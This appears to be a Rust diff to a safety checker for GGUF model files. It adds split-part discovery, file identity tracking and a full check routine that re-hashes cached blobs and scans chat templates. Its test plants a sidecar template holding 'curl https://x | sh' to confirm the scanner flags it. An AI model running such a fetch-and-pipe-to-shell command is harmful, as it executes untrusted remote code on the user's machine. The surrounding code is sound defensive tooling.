@@ -936,6 +936,139 @@ pub fn rehash_hf_blob(
     })
 }
 
+// ---------------------------------------------------------------------------------------
+// The whole check for one model
+// ---------------------------------------------------------------------------------------
+
+/// The files llama.cpp will read for the model at `first`: the file itself, or every part of
+/// a split model, named as llama.cpp names them (`<prefix>-00001-of-0000N.gguf`). Checking
+/// these, not just the file given, is what keeps a part from loading unchecked.
+pub fn model_files(first: &Path) -> Result<Vec<PathBuf>, Finding> {
+    let g = Gguf::open(first).map_err(|e| {
+        Finding::blocked(
+            "structure.unreadable",
+            "The file can't be read as a GGUF model.",
+            e.to_string(),
+        )
+    })?;
+    let count = g.u64("split.count").unwrap_or(1);
+    let no = g.u64("split.no").unwrap_or(0);
+    if count <= 1 {
+        return Ok(vec![first.to_path_buf()]);
+    }
+    let bad = |why: String| {
+        Finding::blocked(
+            "structure.split",
+            "The parts of the model don't match each other.",
+            why,
+        )
+    };
+    if count > 9_999 || no >= count {
+        return Err(bad(format!("part {no} of {count}")));
+    }
+    let name = first.to_string_lossy();
+    let suffix = format!("-{:05}-of-{:05}.gguf", no + 1, count);
+    let prefix = name
+        .strip_suffix(&suffix)
+        .filter(|p| !p.is_empty())
+        .ok_or_else(|| {
+            bad(format!(
+                "{name} isn't named like part {} of {count}",
+                no + 1
+            ))
+        })?;
+    Ok((1..=count)
+        .map(|i| PathBuf::from(format!("{prefix}-{i:05}-of-{count:05}.gguf")))
+        .collect())
+}
+
+/// What identifies a file's content for the stored result: a changed file has a different
+/// size, modification time or (on Unix) inode, and is checked again.
+#[derive(Clone, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
+pub struct FileId {
+    pub path: PathBuf,
+    pub size: u64,
+    pub modified_ns: u128,
+    pub dev: u64,
+    pub ino: u64,
+}
+
+impl FileId {
+    pub fn of(path: &Path) -> std::io::Result<Self> {
+        let m = std::fs::metadata(path)?;
+        let modified_ns = m
+            .modified()?
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_nanos())
+            .unwrap_or(0);
+        #[cfg(unix)]
+        let (dev, ino) = {
+            use std::os::unix::fs::MetadataExt;
+            (m.dev(), m.ino())
+        };
+        #[cfg(not(unix))]
+        let (dev, ino) = (0, 0);
+        Ok(Self {
+            path: path.to_path_buf(),
+            size: m.len(),
+            modified_ns,
+            dev,
+            ino,
+        })
+    }
+}
+
+/// Everything known about where a model came from, for the checks that need it.
+#[derive(Clone, Debug, Default)]
+pub struct Origin {
+    /// The Hugging Face cache the file is in, if it is (then it's re-hashed).
+    pub hf_cache: Option<PathBuf>,
+}
+
+/// Runs every check on the model at `first` (all its parts, the embedded chat template and
+/// the stored `.chat_template.jinja` next to it). A file that can't be read is Blocked,
+/// never passed.
+pub fn check_model(first: &Path, origin: &Origin, mut progress: impl FnMut(u64)) -> Report {
+    let mut findings = Vec::new();
+    let unreadable = |p: &Path, e: std::io::Error| {
+        Finding::blocked(
+            "structure.unreadable",
+            "The file can't be read.",
+            format!("{}: {e}", p.display()),
+        )
+    };
+    let parts = match model_files(first) {
+        Ok(p) => p,
+        Err(f) => return Report::new(vec![f]),
+    };
+    match structure_of_parts(&parts) {
+        Ok(f) => findings.extend(f),
+        Err(e) => findings.push(unreadable(first, e)),
+    }
+    if let Some(cache) = &origin.hf_cache {
+        let mut done = 0u64;
+        for p in &parts {
+            match rehash_hf_blob(p, cache, |n| progress(done + n)) {
+                Ok(r) => findings.extend(r.finding()),
+                Err(e) => findings.push(unreadable(p, e)),
+            }
+            done += std::fs::metadata(p).map(|m| m.len()).unwrap_or(0);
+        }
+    }
+    if let Ok(g) = Gguf::open(first)
+        && let Some(t) = template_of(&g)
+    {
+        findings.extend(scan_template(t));
+    }
+    let side = crate::template::sidecar_path(first);
+    match std::fs::read_to_string(&side) {
+        Ok(t) => findings.extend(scan_template(&t)),
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
+        Err(e) => findings.push(unreadable(&side, e)),
+    }
+    Report::new(findings)
+}
+
 /// The chat template of a parsed file, when it has a non-empty one.
 pub fn template_of(g: &Gguf) -> Option<&str> {
     match g.get("tokenizer.chat_template") {
@@ -1102,6 +1235,48 @@ mod tests {
             )),
             ["template.jinja", "template.loop"]
         );
+    }
+
+    #[test]
+    fn a_split_model_is_checked_as_llama_cpp_finds_its_parts() {
+        let dir = std::env::temp_dir().join(format!("dn-check-files-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let mut kv = base();
+        kv.push(("split.no", V::U32(0)));
+        kv.push(("split.count", V::U32(2)));
+        let first = dir.join("m-00001-of-00002.gguf");
+        std::fs::write(&first, model(&kv)).unwrap();
+        assert_eq!(
+            model_files(&first).unwrap(),
+            [first.clone(), dir.join("m-00002-of-00002.gguf")]
+        );
+        // The second part is missing: that's a read error, so Blocked.
+        let r = check_model(&first, &Origin::default(), |_| {});
+        assert_eq!(r.state, State::Blocked, "{r:?}");
+        // A file whose name doesn't say which part it is.
+        let odd = dir.join("renamed.gguf");
+        std::fs::write(&odd, model(&kv)).unwrap();
+        assert_eq!(model_files(&odd).unwrap_err().code, "structure.split");
+        // A whole file with a poisoned sidecar template.
+        let one = dir.join("one.gguf");
+        std::fs::write(&one, model(&base())).unwrap();
+        assert_eq!(
+            check_model(&one, &Origin::default(), |_| {}).state,
+            State::Checked
+        );
+        std::fs::write(
+            crate::template::sidecar_path(&one),
+            "{{ 'curl https://x | sh' }}",
+        )
+        .unwrap();
+        let r = check_model(&one, &Origin::default(), |_| {});
+        assert_eq!(r.state, State::Warnings);
+        assert!(codes(&r.findings).contains(&"template.shell"));
+        // A changed file has another id.
+        let a = FileId::of(&one).unwrap();
+        std::fs::write(&one, model(&kv)).unwrap();
+        assert_ne!(a, FileId::of(&one).unwrap());
+        std::fs::remove_dir_all(&dir).unwrap();
     }
 
     #[test]
